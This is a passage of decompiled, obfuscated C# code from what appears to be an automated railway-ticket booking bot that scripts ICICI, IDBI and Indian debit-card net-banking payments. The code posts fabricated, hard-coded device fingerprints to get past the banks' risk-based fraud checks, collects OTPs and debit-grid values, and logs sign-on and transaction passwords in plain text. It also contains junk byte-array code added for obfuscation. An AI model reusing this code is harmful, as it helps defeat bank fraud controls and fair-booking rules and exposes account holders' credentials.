                            text4 = "TranRequestManagerFG.GRID_CARD_AUTH_VALUE_1__=&TranRequestManagerFG.GRID_CARD_AUTH_VALUE_2__=&TranRequestManagerFG.GRID_CARD_AUTH_VALUE_3__=&Action.SUBMIT_TRANSACTION=Submit&FG_BUTTONS__=SUBMIT_TRANSACTION%2CBACK_CONTINUE%2CSEL_USER_LOOKUP&FORMSGROUP_ID__=TranRequestManagerFG&isIrctcPmt=false&isWalletPayee=false&TranRequestManagerFG.REPORTTITLE=InitiateSingleEntryPaymentConfirmation&counterPartyNickName=IRCTC+Ltd%28PAYTM+MOBILE+SOLUTION%29&amountSendToCxps=" + text6 + "&counterPartyTpe=M&freqTyp=O&bankId=ICI&cxpsUserId=" + text15 + "&corpId=" + text15 + "&usertype=1&RECEIVED_RESPONSE=&deviceDNA=%7B%22VERSION%22%3A%221.0%22%2C%22MFP%22%3A%7B%22System%22%3A%7B%22Platform%22%3A%22Win32%22%2C%22Language%22%3A%22en-US%22%2C%22Timezone%22%3A-330%2C%22Fonts%22%3A%22%22%7D%2C%22Screen%22%3A%7B%22FullHeight%22%3A768%2C%22AvlHeight%22%3A728%2C%22FullWidth%22%3A1366%2C%22AvlWidth%22%3A1366%2C%22BufferDepth%22%3A%22%22%2C%22ColorDepth%22%3A24%2C%22PixelDepth%22%3A24%2C%22DeviceXDPI%22%3A%22%22%2C%22DeviceYDPI%22%3A%22%22%2C%22FontSmoothing%22%3A%22%22%2C%22UpdateInterval%22%3A%22%22%7D%2C%22Browser%22%3A%7B%22UserAgent%22%3A%22Mozilla%2F5.0+%28Windows+NT+6.3%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F65.0.3325.181+Safari%2F537.36%22%2C%22Vendor%22%3A%22Google+Inc.%22%2C%22VendorSubID%22%3A%22%22%2C%22BuildID%22%3A%22%22%2C%22CookieEnabled%22%3Atrue%7D%2C%22Camera%22%3A%22%22%2C%22Microphone%22%3A%22%22%7D%2C%22MAC%22%3A%22%22%2C%22ExternalIP%22%3A%22192.168.116.30%22%2C%22InternalIP%22%3A%22%22%2C%22MESC%22%3A%22mi%3D2%3Bcd%3D200%3Bid%3D50%3Bmesc%3D475119%3Bldi%3D207%3Bmesc%3D792130%3Bldi%3D213%22%2C%22DESC%22%3A%22%22%7D&executionTime=1234&desc=&mesc=mi%3D2%3Bcd%3D200%3Bid%3D50%3Bmesc%3D475119%3Bldi%3D207%3Bmesc%3D792130%3Bldi%3D213&dnaError=&mescIterationCount=2&isDNADone=true&arcotFlashCookie=&DEVICE_ID=&DEVICE_TYPE=DEVICEID.HTTP&MACHINE_FINGER_PRINT=%7B%22VERSION%22%3A%221.0%22%2C%22MFP%22%3A%7B%22System%22%3A%7B%22Platform%22%3A%22Win32%22%2C%22Language%22%3A%22en-US%22%2C%22Timezone%22%3A-330%2C%22Fonts%22%3A%22%22%7D%2C%22Screen%22%3A%7B%22FullHeight%22%3A768%2C%22AvlHeight%22%3A728%2C%22FullWidth%22%3A1366%2C%22AvlWidth%22%3A1366%2C%22BufferDepth%22%3A%22%22%2C%22ColorDepth%22%3A24%2C%22PixelDepth%22%3A24%2C%22DeviceXDPI%22%3A%22%22%2C%22DeviceYDPI%22%3A%22%22%2C%22FontSmoothing%22%3A%22%22%2C%22UpdateInterval%22%3A%22%22%7D%2C%22Browser%22%3A%7B%22UserAgent%22%3A%22Mozilla%2F5.0+%28Windows+NT+6.3%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F65.0.3325.181+Safari%2F537.36%22%2C%22Vendor%22%3A%22Google+Inc.%22%2C%22VendorSubID%22%3A%22%22%2C%22BuildID%22%3A%22%22%2C%22CookieEnabled%22%3Atrue%7D%2C%22Camera%22%3A%22%22%2C%22Microphone%22%3A%22%22%7D%2C%22MAC%22%3A%22%22%2C%22ExternalIP%22%3A%22192.168.116.30%22%2C%22InternalIP%22%3A%22%22%2C%22MESC%22%3A%22mi%3D2%3Bcd%3D200%3Bid%3D50%3Bmesc%3D475119%3Bldi%3D207%3Bmesc%3D792130%3Bldi%3D213%22%2C%22DESC%22%3A%22%22%7D&FieldDropdown=Value&MFPrint=%7B%22VERSION%22%3A%221.0%22%2C%22MFP%22%3A%7B%22System%22%3A%7B%22Platform%22%3A%22Win32%22%2C%22Language%22%3A%22en-US%22%2C%22Timezone%22%3A-330%2C%22Fonts%22%3A%22%22%7D%2C%22Screen%22%3A%7B%22FullHeight%22%3A768%2C%22AvlHeight%22%3A728%2C%22FullWidth%22%3A1366%2C%22AvlWidth%22%3A1366%2C%22BufferDepth%22%3A%22%22%2C%22ColorDepth%22%3A24%2C%22PixelDepth%22%3A24%2C%22DeviceXDPI%22%3A%22%22%2C%22DeviceYDPI%22%3A%22%22%2C%22FontSmoothing%22%3A%22%22%2C%22UpdateInterval%22%3A%22%22%7D%2C%22Browser%22%3A%7B%22UserAgent%22%3A%22Mozilla%2F5.0+%28Windows+NT+6.3%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F65.0.3325.181+Safari%2F537.36%22%2C%22Vendor%22%3A%22Google+Inc.%22%2C%22VendorSubID%22%3A%22%22%2C%22BuildID%22%3A%22%22%2C%22CookieEnabled%22%3Atrue%7D%2C%22Camera%22%3A%22%22%2C%22Microphone%22%3A%22%22%7D%2C%22MAC%22%3A%22%22%2C%22ExternalIP%22%3A%22192.168.116.30%22%2C%22InternalIP%22%3A%22%22%2C%22MESC%22%3A%22mi%3D2%3Bcd%3D200%3Bid%3D50%3Bmesc%3D475119%3Bldi%3D207%3Bmesc%3D792130%3Bldi%3D213%22%2C%22DESC%22%3A%22%22%7D&xyz=&ABC=ABC&JS_ENABLED_FLAG=Y&CHECKBOX_NAMES__=&Requestid=2&TranRequestManagerFG.__COLLAPSIBLE_IDS__=";
                            while (true)
                            {
                                if (string_97.IndexOf("Please enter the following digits of your Debit Grid") > 0)
                                {
                                    string text19 = array3[5];
                                    string text20 = string_97.Substring(string_97.IndexOf("Please enter the following digits of your Debit Grid"));
                                    int num3 = 1;
                                    do
                                    {
                                        string text21 = text20.Substring(text20.IndexOf("gridauth_input_cell_style") + 27);
                                        text21 = text21.Substring(0, text21.IndexOf("</td>"));
                                        string string_98 = "";
                                        text20 = text20.Substring(text20.IndexOf("gridauth_input_cell_style") + 27);
                                        if (string.IsNullOrEmpty(text19))
                                        {
                                            string_98 = Interaction.InputBox("Enter Debit Card Grid Value For Following Digit: " + text21);
                                        }
                                        else
                                        {
                                            string[] array5 = Strings.Split(text19, "&&");
                                            for (int k = 0; k < array5.Length; k++)
                                            {
                                                string[] array6 = Strings.Split(array5[k], "=");
                                                if (text21.Contains(array6[0]))
                                                {
                                                    string_98 = array6[1];
                                                }
                                            }
                                        }
                                        text4 = clsPostData.SetPost(text4, "TranRequestManagerFG.GRID_CARD_AUTH_VALUE_" + num3 + "__", string_98);
                                        num3++;
                                    }
                                    while (num3 != 4 && text20.IndexOf("gridauth_input_cell_style") > 0);
                                }
                                while (true)
                                {
                                    if (string_97.Contains("TranRequestManagerFG.ONE_TIME_PASSWORD__"))
                                    {
                                        frmOTP frmOTP = new frmOTP();
                                        frmOTP.method_1ICI(clsMain.control_0, clsMain.rectangle_0, bool_2: true, "ICICI", "ICICI_" + array[2]);
                                        if (frmOTP.DialogResult != DialogResult.OK)
                                        {
                                            clsMain.Lock("OTP Cancel");
                                            string_91 = "OTP Cancelled By User";
                                            updateTStatus_1.BeginInvoke(2, "OTP Cancelled By User", tCntrlName_, null, null);
                                            sbiActive = false;
                                            return false;
                                        }
                                        text18 = frmOTP.string_0;
                                        frmOTP.Dispose();
                                        string text22 = text18;// Interaction.InputBox("Please Re-Register for I-Safe, Enter new OTP Received on Mobile.", "ICICI Bank Mobile OTP.", "", clsMain.control_0.PointToScreen(clsMain.rectangle_0.Location).X, clsMain.control_0.PointToScreen(clsMain.rectangle_0.Location).Y).Trim();
                                        if (text22.Length >= 5)
                                        {
                                            string_94 = text22;
                                        }
                                        text4 = clsPostData.SetPost(text4, "TranRequestManagerFG.ONE_TIME_PASSWORD__", string_94);
                                        //string string_94444 = Interaction.InputBox("Enter OTP", "Enter otp");
                                        //text4 = "TranRequestManagerFG.ONE_TIME_PASSWORD__="+ string_94444;
                                    }
                                    startIndex = string_97.IndexOf("name=\"TranRequestManagerFG") + 10;
                                    startIndex = string_97.IndexOf("=\"", startIndex) + 2;
                                    length = string_97.IndexOf("\"", startIndex) - startIndex;
                                    text7 = string_97.Substring(startIndex, length);
                                    startIndex = string_97.IndexOf("counterPartyNickName", startIndex);
                                    startIndex = string_97.IndexOf("lue=\"", startIndex) + 5;
                                    length = string_97.IndexOf("\"", startIndex) - startIndex;
                                    string_97.Substring(startIndex, length).Trim();
                                    startIndex = string_97.IndexOf("amountSendToCxps", startIndex);
                                    startIndex = string_97.IndexOf("lue=\"", startIndex) + 5;
                                    length = string_97.IndexOf("\"", startIndex) - startIndex;
                                    string_97.Substring(startIndex, length).Trim();
                                    startIndex = string_97.IndexOf("counterPartyTpe", startIndex);
                                    startIndex = string_97.IndexOf("lue=\"", startIndex) + 5;
                                    length = string_97.IndexOf("\"", startIndex) - startIndex;
                                    string text23 = string_97.Substring(startIndex, length).Trim();
                                    startIndex = string_97.IndexOf("freqTyp", startIndex);
                                    startIndex = string_97.IndexOf("lue=\"", startIndex) + 5;
                                    length = string_97.IndexOf("\"", startIndex) - startIndex;
                                    string text24 = string_97.Substring(startIndex, length).Trim();
                                    startIndex = string_97.IndexOf("Requestid", startIndex);
                                    startIndex = string_97.IndexOf("lue=\"", startIndex) + 5;
                                    length = string_97.IndexOf("\"", startIndex) - startIndex;
                                    text18 = string_97.Substring(startIndex, length).Trim();
                                    text4 = text4 + "&Action.SUBMIT_TRANSACTION=Submit&FG_BUTTONS__=SUBMIT_TRANSACTION%2cBACK_CONTINUE%2cSEL_USER_LOOKUP&FORMSGROUP_ID__=TranRequestManagerFG&isIrctcPmt=false&isWalletPayee=false&TranRequestManagerFG.REPORTTITLE=InitiateSingleEntryPaymentConfirmation&counterPartyNickName=IRCTC+Ltd%28PAYTM+MOBILE+SOLUTION%29&amountSendToCxps=" + text6 + "&counterPartyTpe=" + text23 + "&freqTyp=" + text24 + "&bankId=ICI&cxpsUserId=" + text15 + "&corpId=" + text16 + "&usertype=" + text17 + "&RECEIVED_RESPONSE=&JS_ENABLED_FLAG=N&CHECKBOX_NAMES__=&Requestid=" + text18 + "&TranRequestManagerFG.__COLLAPSIBLE_IDS__=&__JS_ENCRYPT_KEY__=10001%2c882f01917b854d8314dbd6ea2cdae899a60edee39050a4e89fbaf151925918920ad15a3d8e23cf2f057d6aeb3887da04f841fb35b4f254b6801611d0746360bafbc2e70a6c6c974825e55cf0aefea430c487d1c550a193f8e88b9d0952ac3a96780c7a8b5dc685efa520c69e07f60dea017731f9cbd19cc95ba7e8fa167a2d3f%2c131&deviceDNA=&executionTime=0&desc=&mesc=mi%3D2%3Bcd%3D200%3Bid%3D50&dnaError=&mescIterationCount=0&isDNADone=false&arcotFlashCookie=&Action.SUBMIT_TRANSACTION=Submit";
                                    text5 = "https://shopping.icicibank.com/corp/Finacle";
                                    text7 = string_97.Substring(string_97.IndexOf("Finacle") + 7);
                                    text7 = text7.Substring(0, text7.IndexOf("\""));
                                    //
                                    string SL_ACC = string_97.Substring(string_97.IndexOf("option selected value") + 23);
                                    SL_ACC = SL_ACC.Substring(0, SL_ACC.IndexOf("\""));

                                    string renum = string_97.Substring(string_97.IndexOf("userId") + 10);
                                    renum = renum.Substring(0, renum.IndexOf("'"));//TOTAL_TXN_AMT

                                    string TOTAL_TXN_AMT = string_97.Substring(string_97.IndexOf("TOTAL_TXN_AMT") + 15);
                                    TOTAL_TXN_AMT = TOTAL_TXN_AMT.Substring(0, TOTAL_TXN_AMT.IndexOf("<"));

                                    string ChatEncUserId = string_97.Substring(string_97.IndexOf("ChatEncUserId") + 22);
                                    ChatEncUserId = ChatEncUserId.Substring(0, ChatEncUserId.IndexOf("\""));
                                    ChatEncUserId = HttpUtility.UrlEncode(ChatEncUserId);

                                    string __JS_ENCRYPT_KEY__ = string_97.Substring(string_97.IndexOf("__JS_ENCRYPT_KEY__") + 53);
                                    __JS_ENCRYPT_KEY__ = __JS_ENCRYPT_KEY__.Substring(0, __JS_ENCRYPT_KEY__.IndexOf("'><"));
                                    __JS_ENCRYPT_KEY__ = HttpUtility.UrlEncode(__JS_ENCRYPT_KEY__);

                                    text4 = "TranRequestManagerFG.SEL_ACC=" + SL_ACC + "&TranRequestManagerFG.CP_REMARKS_SINGLE=&TranRequestManagerFG.ONE_TIME_PASSWORD__="+ string_94 + "&TranRequestManagerFG.RESEND_OTP_FLAG__=N&TranRequestManagerFG.RESEND_OTP_ATTEMPTS_COUNT__=1&RESEND_OTP_TIMER=50&RESEND_OTP_SCENARIO=ShoppingMall&RESEND_OTP_RELNUM=" + renum + "&RESEND_OTP_APPTYPE=desktop&TranRequestManagerFG.OTP_ON_CALL_ATTEMPTS_COUNT__=0&FORMGROUPID=TranRequestManagerFG.RESEND_OTP_FLAG__&OTP_ON_CALL_TIMER=50&TranRequestManagerFG.OTP_ON_CALL_ATTEMPTS_COUNT__=0&TranRequestManagerFG.RESEND_OTP_ATTEMPTS_COUNT__=1&Action.SUBMIT_TRANSACTION=Pay&FG_BUTTONS__=SUBMIT_TRANSACTION%2CBACK_CONTINUE%2CSEL_USER_LOOKUP&FORMSGROUP_ID__=TranRequestManagerFG&isIrctcPmt=false&isWalletPayee=false&txnTypeValue=SHP&isCD=false&IS_FULLDIS=Y&IS_PAYPL=false&TranRequestManagerFG.REPORTTITLE=CustomInitiateSingleEntryPaymentShoppingMallConfirmation_MDOTRVMP&counterPartyNickName=IRCTC+Limited%28PAYTM+MOBILE+SOLUTION%29&amountSendToCxps=" + TOTAL_TXN_AMT + "&counterPartyTpe=M&freqTyp=O&bankId=ICI&cxpsUserId=" + text15 + "&corpId=" + text15 + "&usertype=1&RECEIVED_RESPONSE=&FieldDropdown=&TxnType=SHP&CHAT_USERID=570568309&FEDID=" + renum + "&ChatEncUserId=" + ChatEncUserId + "&MFPrint=&xyz=&ABC=ABC&JS_ENABLED_FLAG=N&CHECKBOX_NAMES__=&Requestid=1&TranRequestManagerFG.__COLLAPSIBLE_IDS__=%7C&__JS_ENCRYPT_KEY__=" + __JS_ENCRYPT_KEY__;

                                    string_95 = text5 + text7;
                                    clsMain.Lock("Fourth Hit Inp = " + text4);
                                    if (updateTStatus_1 != null)
                                    {
                                        updateTStatus_1.BeginInvoke(1, "Init. ICICI_NB(3/3)", tCntrlName_, null, null);
                                    }
                                    if (_Request(string_95, text4, string_92, webProxy_3, ref cookieContainer_, true, true, num, num, ref string_97, ref string_96, ref webException_0))
                                    {
                                        clsMain.Lock("Fourth Hit output = " + string_97);
                                        if (string_97.Contains("Your Merchant Reference Number is"))
                                        {
                                            break;
                                        }
                                        string_91 = "";
                                        if (string_97.Contains(">Input i-safe OTP is Invalid<") || string_97.Contains("OTP is Invalid<"))
                                        {
                                            if (num2 <= 1)
                                            {
                                                goto IL_11a9;
                                            }
                                            string_91 = "I-Safe OTP is Invalid";
                                            string prompt = "Input i-safe OTP is Invalid, Please enter new OTP.";
                                            string title = "ICICI Bank i-Safe Andriod APP.";
                                            string defaultResponse = "";
                                            int x = clsMain.control_0.PointToScreen(clsMain.rectangle_0.Location).X;
                                            string text25 = Interaction.InputBox(prompt, title, defaultResponse, x, clsMain.control_0.PointToScreen(clsMain.rectangle_0.Location).Y).Trim();
                                            if (text25.Length >= 5)
                                            {
                                                string_94 = text25;
                                                continue;
                                            }
                                        }
                                        if (string_97.Contains("errormsg"))
                                        {
                                            startIndex = string_97.IndexOf("errormsg");
                                            startIndex = string_97.IndexOf(">", startIndex) + 1;
                                            length = string_97.IndexOf("<", startIndex) - startIndex;
                                            string_96 = string_97.Substring(startIndex, length).Trim();
                                        }
                                        if (string.IsNullOrEmpty(string_91))
                                        {
                                            string_91 = "Failed while Processing into ICICI, Ticket Not Booked";
                                        }
                                        clsMain.Lock("Fourth Hit Failed, Not valid HTML err = " + string_91);
                                        return false;
                                    }
                                    clsMain.Lock("Fourth Hit Failed. err = " + string_96);
                                    string_91 = "Failed while making Payment at ICICI NB. Ticket Not Booked";
                                    return false;
                                }
                                break;
                            IL_11a9:
                                clsMain.Lock("invalid isafe, rehitting");
                                num2++;
                            }
                        }
                        startIndex = string_97.IndexOf("name=\"TranRequestManagerFG.RETURN_URL") + 10;
                        startIndex = string_97.IndexOf("lue=\"", startIndex) + 5;
                        length = string_97.IndexOf("\"", startIndex) - startIndex;
                        text7 = string_97.Substring(startIndex, length).Trim();
                        string_90 = HttpUtility.HtmlDecode(text7);
                        string_91 = string_95;
                        return true;
                    }
                }
                catch (Exception ex)
                {
                    clsMain.method_74("ProcessICICINetBanking", ex.Message);
                    result = false;
                }
                return result;
            }
            byte[] array7 = new byte[217];
            array7[128] = 0;
            array7[129] = 199;
            array7[133] = 9;
            string text26 = "Æ\u009aj\u0082\u007fÍ;>";
            for (int l = 0; l < text26.Length; l++)
            {
                array7[l + 137] = (byte)text26[l];
            }
            array7[100] = 86;
            array7[131] = 11;
            array7[94] = byte.MaxValue;
            array7[146] = 20;
            array7[103] = 252;
            array7[101] = 50;
            string text27 = "Some thing went wrong with ICICI Payment";
            array7[148] = 212;
            string_91 = text27;
            array7[108] = 71;
            array7[130] = 76;
            array7[93] = 120;
            array7[135] = 183;
            array7[145] = 251;
            string text28 = "Þ×3Üìù\u0085";
            for (int m = 0; m < text28.Length; m++)
            {
                array7[m + 150] = (byte)text28[m];
            }
            array7[158] = 25;
            array7[159] = 81;
            array7[105] = 236;
            array7[132] = 176;
            array7[147] = 153;
            array7[102] = 248;
            array7[97] = 220;
            array7[98] = 68;
            string string_99 = "Html doesn't contains icicibank, returning.";
            array7[134] = 132;
            array7[149] = 239;
            array7[157] = 52;
            clsMain.Lock(string_99);
            array7[106] = 193;
            string text29 = "ª\u007fMòn£Ì\u00a0\a£\u0099ÍD2ýø \0";
            for (int n = 0; n < text29.Length; n++)
            {
                array7[n + 109] = (byte)text29[n];
            }
            array7[136] = 110;
            array7[160] = 137;
            array7[96] = 113;
            array7[99] = 10;
            array7[104] = 140;
            array7[107] = 221;
            array7[127] = 0;
            array7[95] = 94;
            Class27.byte_3 = array7;
            return false;
        }

        private bool method_117(string string_86, string string_87, string string_88, ref string string_89, ref string string_90, UpdateTStatus updateTStatus_2)
        {
            int num = 0;
            string_89 = "";
            string_90 = "";
            int num2 = 90000;
            clsMain.Lock("Enter ProcessIDBINetBanking.");
            if (string_86.Contains("idbibank.co.in"))
            {
                string_89 = "";
                string string_91 = class3_0.string_70;
                string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
                string text = array[0].Trim();
                string text2 = array[1];
                string text3 = array[2];
                string string_92 = "";
                string text4 = "";
                if (bool_13)
                {
                    bool_13 = false;
                    string[] array2 = string_86.Split(new string[1] { "|" }, StringSplitOptions.None);
                    string_92 = array2[0];
                    text3 = array2[1];
                }
                else
                {
                    text4 = class3_0.Method_SerialInp(string_86, ref string_92, false);
                }
                CookieContainer cookieContainer_ = null;
                string text5 = "https://inet.idbibank.co.in/corp/";
                string string_93 = "";
                string string_94 = "";
                try
                {
                    clsMain.Lock("First Hit : Inp = " + text4);
                    if (updateTStatus_1 != null)
                    {
                        updateTStatus_1.BeginInvoke(1, "Init. IDBI_NB(1/4)", tCntrlName_, null, null);
                    }
                    if (!_Request(string_92, text4, string_91, webProxy_3, ref cookieContainer_, true, true, num2, num2, ref string_94, ref string_93, ref webException_0))
                    {
                        clsMain.Lock("First Hit Failed. err = " + string_93);
                        string_90 = "IDBI Not Working - Payment Failed";
                        return false;
                    }
                    clsMain.Lock("First Output htm = " + string_94);
                    if (!string.IsNullOrEmpty(string_94.Trim()) && string_94.Contains("CustomerID"))
                    {
                        string text6 = "";
                        string text7 = "";
                        int startIndex = string_94.IndexOf("ACTION");
                        startIndex = string_94.IndexOf("=", startIndex) + 1;
                        startIndex = string_94.IndexOf("\"", startIndex) + 1;
                        int length = string_94.IndexOf("\"", startIndex) - startIndex;
                        text6 = string_94.Substring(startIndex, length);
                        string text8 = "";
                        startIndex = string_94.IndexOf("\"publickey");
                        if (startIndex > 0)
                        {
                            startIndex = string_94.IndexOf("ue=\"", startIndex) + 4;
                            length = string_94.IndexOf("\"", startIndex) - startIndex;
                            text8 = string_94.Substring(startIndex, length);
                            if (text7.Length <= 0)
                            {
                                do
                                {
                                    RandomString(16, "0123456789");
                                    string text9 = "IDBI";
                                    updateTStatus_2?.Invoke(1003, text9 + "||" + text2 + "||" + text8, "");
                                    if (clsMain.dictionary_5.ContainsKey("IDBI"))
                                    {
                                        object obj = new object();
                                        object obj2 = obj;
                                        lock (obj2)
                                        {
                                            text7 = clsMain.dictionary_5[text9];
                                            clsMain.Lock("Encrypted Data, out = " + text7);
                                            clsMain.dictionary_5.Remove(text9);
                                        }
                                    }
                                }
                                while (text7 == "");
                                clsMain.Lock("EncServerHit out: " + text7);
                                if (text7.Length < 20)
                                {
                                    string_90 = "Encryption Failed";
                                    return false;
                                }
                            }
                            text2 = text7;
                            text7 = "";
                            text4 = "CorporateSignonCorpId=" + text + "&CorporateSignonPassword=" + HttpUtility.UrlEncode(text2) + "&Action.ShoppingMall.Signon=+Login+&isEncrypted=Y";
                        }
                        else
                        {
                            text4 = "CorporateSignonCorpId=" + text + "&CorporateSignonPassword=" + HttpUtility.UrlEncode(text2) + "&Action.ShoppingMall.Signon=+Login+";
                        }
                        string_91 = string_92;
                        string_92 = text5 + text6;
                        clsMain.Lock("Second Hit : Inp = " + text4);
                        if (updateTStatus_1 != null)
                        {
                            updateTStatus_1.BeginInvoke(1, "Init. IDBI_NB(2/4)", tCntrlName_, null, null);
                        }
                        if (!_Request(string_92, text4, string_91, webProxy_3, ref cookieContainer_, true, true, num2, num2, ref string_94, ref string_93, ref webException_0))
                        {
                            clsMain.Lock("Second Hit Failed. err = " + string_93);
                            string_90 = "Failed while making Payment. Payment Not Done";
                            return false;
                        }
                        clsMain.Lock("Second Hit Output = " + string_94);
                        if (!string_94.Contains("Payment Amount"))
                        {
                            if (string_94.Contains("errormsg"))
                            {
                                startIndex = string_94.IndexOf("errormsg");
                                startIndex = string_94.IndexOf(">", startIndex) + 1;
                                length = string_94.IndexOf("<", startIndex) - startIndex;
                                string_90 = string_94.Substring(startIndex, length).Trim();
                            }
                            if (string.IsNullOrEmpty(string_90))
                            {
                                string_90 = "Failed while Login into IDBI";
                            }
                            clsMain.Lock("Second Hit, Not valid HTML err = " + string_90);
                            return false;
                        }
                        startIndex = string_94.IndexOf("ACTION");
                        startIndex = string_94.IndexOf("=", startIndex) + 1;
                        startIndex = string_94.IndexOf("\"", startIndex) + 1;
                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                        text6 = string_94.Substring(startIndex, length);
                        text4 = "retrnflag=1&UserAccountsIndex=0&bills.PaymentRemarks=&bills.HotPaymentFlag=Y&Action.Bills.ShoppingMall.MakePayment.Pay.x=&Action.Bills.ShoppingMall.MakePayment.Pay.y=";
                        string_91 = string_92;
                        string_92 = text5 + text6;
                        clsMain.Lock("Third Hit Inp = " + text4);
                        if (updateTStatus_1 != null)
                        {
                            updateTStatus_1.BeginInvoke(1, "Init. IDBI_NB(3/4)", tCntrlName_, null, null);
                        }
                        if (!_Request(string_92, text4, string_91, webProxy_3, ref cookieContainer_, true, true, num2, num2, ref string_94, ref string_93, ref webException_0))
                        {
                            clsMain.Lock("Third Hit Failed. err = " + string_93);
                            string_90 = "Failed while making Payment. Payment Not Done";
                            return false;
                        }
                        clsMain.Lock("Third Hit Output = " + string_94);
                        if (!string_94.Contains("Enter your Transaction Password"))
                        {
                            string_90 = "";
                            if (string_94.Contains("errormsg"))
                            {
                                startIndex = string_94.IndexOf("errormsg");
                                startIndex = string_94.IndexOf(">", startIndex) + 1;
                                length = string_94.IndexOf("<", startIndex) - startIndex;
                                string_90 = string_94.Substring(startIndex, length).Trim();
                            }
                            if (string.IsNullOrEmpty(string_90))
                            {
                                string_90 = "Failed while Processing into IDBI";
                            }
                            clsMain.Lock("Third Hit Failed, Not valid HTML err = " + string_90);
                            return false;
                        }
                        startIndex = string_94.IndexOf("\"publickey");
                        if (startIndex > 0)
                        {
                            startIndex = string_94.IndexOf("ue=\"", startIndex) + 4;
                            length = string_94.IndexOf("\"", startIndex) - startIndex;
                            text8 = string_94.Substring(startIndex, length);
                            if (text7.Length <= 0)
                            {
                                do
                                {
                                    RandomString(16, "0123456789");
                                    string text10 = "IDBI";
                                    updateTStatus_2?.Invoke(1003, text10 + "||" + text3 + "||" + text8, "");
                                    if (clsMain.dictionary_5.ContainsKey("IDBI"))
                                    {
                                        object obj3 = new object();
                                        object obj4 = obj3;
                                        lock (obj4)
                                        {
                                            text7 = clsMain.dictionary_5[text10];
                                            clsMain.Lock("Encrypted Data, out = " + text7);
                                            clsMain.dictionary_5.Remove(text10);
                                        }
                                    }
                                }
                                while (text7 == "");
                                clsMain.Lock("EncServerHit out: " + text7);
                                if (text7.Length < 20)
                                {
                                    string_90 = "Encryption Failed";
                                    return false;
                                }
                            }
                            text3 = text7;
                            text4 = "ValCorpTxnPwdUserName=" + text + "&ValCorpTxnPwdTxnPwd=" + HttpUtility.UrlEncode(text3) + "&Action.bills.Eticketing.ShoppingMall.TxnLogin.Ok=%A0%A0%A0Pay%A0%A0%A0&isEncrypted=Y";
                        }
                        else
                        {
                            text4 = "ValCorpTxnPwdUserName=" + text + "&ValCorpTxnPwdTxnPwd=" + HttpUtility.UrlEncode(text3) + "&Action.bills.Eticketing.ShoppingMall.TxnLogin.Ok=%A0%A0%A0Pay%A0%A0%A0";
                        }
                        string_91 = string_92;
                        string_92 = string_92.Replace("M%3D", "A%3D");
                        clsMain.Lock("Fourth Hit Inp = " + text4);
                        if (updateTStatus_1 != null)
                        {
                            updateTStatus_1.BeginInvoke(1, "Init. IDBI_NB(4/4)", tCntrlName_, null, null);
                        }
                        if (!_Request(string_92, text4, string_91, webProxy_3, ref cookieContainer_, true, true, num2, num2, ref string_94, ref string_93, ref webException_0))
                        {
                            clsMain.Lock("Fourth Hit Failed. err = " + string_93);
                            string_90 = "Failed while making Payment at IDBI. Ticket Not Booked";
                            return false;
                        }
                        clsMain.Lock("Fourth Hit output = " + string_94);
                        if (!string_94.Contains("Your transaction has been completed successfully") && !string_94.Contains("redirecting to shopping site"))
                        {
                            string_90 = "";
                            if (string_94.Contains("errormsg"))
                            {
                                startIndex = string_94.IndexOf("errormsg");
                                startIndex = string_94.IndexOf(">", startIndex) + 1;
                                length = string_94.IndexOf("<", startIndex) - startIndex;
                                string_93 = string_94.Substring(startIndex, length).Trim();
                            }
                            if (string.IsNullOrEmpty(string_90))
                            {
                                string_90 = "Failed while Processing into IDBI, Ticket Not Booked";
                            }
                            clsMain.Lock("Fourth Hit Failed, Not valid HTML err = " + string_90);
                            return false;
                        }
                        clsMain.Lock("IDBI NB SUCCESS");
                        string_89 = string_94;
                        string_90 = string_92;
                        num = 1;
                    }
                }
                catch (Exception ex)
                {
                    clsMain.method_74("ProcessIDBINetBanking", ex.Message);
                    num = 0;
                }
                return num != 0;
            }
            string_90 = "Some thing went wrong with IDBI Payment";
            clsMain.Lock("Html doesn't contains idbibank.co.in, returning.");
            return false;
        }

        private string RandomString(int int_28, string string_86)
        {
            char[] array = new char[int_28];
            Random random = new Random();
            for (int i = 0; i < array.Length; i++)
            {
                array[i] = string_86[random.Next(string_86.Length)];
            }
            return new string(array);
        }

        internal bool method_118(string string_86, string string_87, string string_88, ref string string_89, ref string string_90, UpdateTStatus updateTStatus_2)
        {
            string_89 = "";
            string_90 = "";
            clsMain.Lock("Enter ProcessIndianDebit.");
            if (string_86.Contains("fssnet.co.in"))
            {
                string_89 = "";
                string string_91 = class3_0.string_70;
                string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
                string text = array[0].Trim();
                string text2 = array[6];
                string text3 = array[1];
                string text4 = array[3];
                string text5 = array[4];
                string string_92 = "";
                string text6 = class3_0.Method_SerialInp(string_86, ref string_92, false);
                CookieContainer cookieContainer_ = null;
                string string_93 = "";
                string string_94 = "";
                if (text3.Length == 2 && text3[0] == '0')
                {
                    text3 = text3.Substring(1, 1);
                }
                try
                {
                    bool_27 = true;
                    clsMain.Lock("First Hit Inp = " + text6);
                    if (!_Request(string_92, text6, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
                    {
                        clsMain.Lock("First Hit Failed. err = " + string_93);
                        string_90 = "Indian Debit Not Working - Payment Failed";
                        return false;
                    }
                    clsMain.Lock("First Output htm = " + string_94);
                    if (!string.IsNullOrEmpty(string_94.Trim()) && string_94.Contains("paymentId"))
                    {
                        string text7 = "ECB";
                        int startIndex = string_94.IndexOf("function encrypData");
                        startIndex = string_94.IndexOf("var paymentId", startIndex);
                        startIndex = string_94.IndexOf("\"", startIndex) + 1;
                        int length = string_94.IndexOf("\"", startIndex) - startIndex;
                        string text8 = string_94.Substring(startIndex, length).Replace("'", "").Trim();
                        startIndex = string_94.IndexOf("var encCaptcha");
                        startIndex = string_94.IndexOf("\"", startIndex) + 1;
                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                        string text9 = string_94.Substring(startIndex, length).Replace("'", "").Trim();
                        startIndex = string_94.IndexOf("CSRFToken\"", startIndex);
                        startIndex = string_94.IndexOf("lue=\"", startIndex) + 5;
                        length = string_94.IndexOf("\"", startIndex) - startIndex;
